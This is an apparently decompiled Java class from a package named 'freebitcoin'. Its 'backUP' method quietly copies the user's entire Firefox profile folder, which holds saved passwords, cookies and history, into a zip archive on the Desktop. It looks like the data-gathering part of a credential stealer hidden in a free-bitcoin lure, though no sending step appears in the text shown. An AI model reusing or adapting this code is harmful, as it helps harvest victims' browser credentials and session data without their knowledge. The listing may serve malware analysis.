// 
// Decompiled by Procyon v0.5.30
// 

package com.freebitcoin.app.control;

import java.util.zip.ZipEntry;
import java.io.FileInputStream;
import java.io.File;
import java.io.OutputStream;
import java.util.zip.ZipOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.FileNotFoundException;

public class Zip
{
    public void backUP() throws FileNotFoundException, IOException, Exception {
        zipFolder("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox", "C:\\Users\\" + System.getProperty("user.name") + "\\Desktop\\prueva.zip");
    }
    
    public static void zipFolder(final String srcFolder, final String destZipFile) throws Exception {
        System.out.println("---Escribiendo Archivo Temporal");
        ZipOutputStream zip = null;
        FileOutputStream fileWriter = null;
        fileWriter = new FileOutputStream(destZipFile);
        zip = new ZipOutputStream(fileWriter);
        addFolderToZip("", srcFolder, zip);
        zip.flush();
        zip.close();
    }
    
    private static void addFileToZip(final String path, final String srcFile, final ZipOutputStream zip) throws Exception {
        final File folder = new File(srcFile);
        if (folder.isDirectory()) {
            addFolderToZip(path, srcFile, zip);
        }
        else {
            final byte[] buf = new byte[1024];
            final FileInputStream in = new FileInputStream(srcFile);
            zip.putNextEntry(new ZipEntry(path + "/" + folder.getName()));
            System.out.println("    Writing '" + path + "/" + folder.getName() + " '");
            int len;
            while ((len = in.read(buf)) > 0) {
                zip.write(buf, 0, len);
            }
        }
    }
    
    private static void addFolderToZip(final String path, final String srcFolder, final ZipOutputStream zip) throws Exception {
        final File folder = new File(srcFolder);
        for (final String fileName : folder.list()) {
            if (path.equals("")) {
                addFileToZip(folder.getName(), srcFolder + "/" + fileName, zip);
            }
            else {
                addFileToZip(path + "/" + folder.getName(), srcFolder + "/" + fileName, zip);
            }
        }
    }
}
